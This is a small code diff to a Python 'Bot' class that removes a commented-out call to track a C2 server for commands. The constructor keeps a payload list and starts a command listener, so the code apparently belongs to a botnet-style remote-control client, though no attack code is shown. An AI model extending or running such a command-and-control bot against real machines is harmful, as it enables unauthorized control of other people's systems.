@@ -22,7 +22,6 @@ class Bot:
         self.previous_command = None
         self.payloads = []
         self.quit = False
-        # self.__track_C2()  # Start tracking C2 server for commands
         self.listener.start_command_listener()
 
 
